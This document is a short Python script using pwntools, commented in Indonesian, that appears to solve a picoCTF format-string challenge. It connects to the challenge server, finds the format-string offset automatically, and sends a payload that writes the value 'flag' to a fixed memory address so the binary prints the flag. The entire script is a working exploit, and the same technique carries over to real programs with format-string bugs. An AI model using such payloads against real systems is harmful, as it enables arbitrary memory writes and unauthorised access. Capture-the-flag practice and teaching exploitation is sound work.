# Mengimpor semua fungsi dari pwntools.
from pwn import *

# Mengatur level log ke "critical" untuk mengurangi output.
# Mengatur konteks binary ke file 'vuln', yang mungkin adalah binary yang rentan.
context.log_level = "critical"
context.binary = ELF('./vuln')

# Membuat koneksi remote ke server target.
p = remote('rhea.picoctf.net', 64652)

# Fungsi ini membuat koneksi baru, mengirim payload, dan mengembalikan semua respons.
# Digunakan untuk menguji berbagai payload format string.
def exec_fmt(payload):
    p = remote('rhea.picoctf.net', 64652)
    p.sendline(payload)
    return p.recvall()

# Menggunakan FmtStr dari pwntools untuk secara otomatis menemukan offset yang benar untuk eksploitasi format string.
autofmt = FmtStr(exec_fmt)
offset = autofmt.offset

# Membuat payload format string yang akan menulis nilai 0x67616c66 (ASCII untuk "flag") ke alamat 0x404060.
payload = fmtstr_payload(offset, {0x404060: 0x67616c66})

# Mengirim payload ke target.
# Menerima semua data yang dikembalikan (yang seharusnya berisi flag).
# Mencetak flag.
p.sendline(payload)
flag = p.recvall()
print("Flag: ", flag)